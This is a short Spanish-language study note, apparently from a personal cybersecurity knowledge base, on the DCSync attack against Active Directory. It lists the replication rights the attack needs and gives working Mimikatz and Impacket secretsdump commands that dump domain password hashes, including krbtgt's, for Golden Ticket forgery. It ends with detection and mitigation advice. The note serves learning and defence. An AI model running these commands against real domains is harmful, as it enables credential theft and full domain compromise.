#reference #Ciberseguridad

**DCSync** = ataque a Active Directory que **simula ser un Domain Controller** y pide la replicación de credenciales vía el protocolo **MS-DRSR** (Directory Replication Service). Permite volcar hashes (incluido el de `krbtgt`) **sin tocar el DC ni LSASS**, de forma sigilosa.

# Requisito

La cuenta necesita los permisos de replicación sobre el dominio:

- `DS-Replication-Get-Changes`
- `DS-Replication-Get-Changes-All`

Por defecto los tienen: **Domain Admins, Enterprise Admins, Administrators** y los DCs. Una ACL mal configurada que conceda esto a un usuario normal = vía directa a comprometer el dominio.

# Ejecución

```bash
# Mimikatz — volcar el hash de un usuario
lsadump::dcsync /domain:corp.local /user:Administrator

# krbtgt -> permite Golden Ticket
lsadump::dcsync /domain:corp.local /user:krbtgt

# Impacket (desde Linux) — volcar TODO el dominio
secretsdump.py corp.local/usuario:password@dc.corp.local
secretsdump.py -just-dc corp.local/usuario@dc.corp.local
secretsdump.py -just-dc-user krbtgt corp.local/usuario@dc.corp.local
```

# Por qué importa

- Obtener el hash de **krbtgt** → forjar un **Golden Ticket** (acceso persistente a todo el dominio).
- Hashes de cualquier usuario → **Pass-the-Hash**, cracking offline.
- No genera logs en el DC como un dump local; se parece a tráfico de replicación legítimo.

# Detección / mitigación

- Auditar quién tiene los derechos de replicación (`Get-ObjectAcl` / [[PowerView]], BloodHound → ver [[Bloodhound]]).
- Alertar sobre **DRSR (eventos de replicación)** desde IPs que no son DCs.
- Principio de mínimo privilegio en las ACL del objeto dominio.

# Recursos
### [[PowerShell_CS]] · [[Bloodhound]] · [[PowerView]]
### [HackTricks — DCSync](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)
### [Impacket — secretsdump](https://github.com/fortra/impacket)
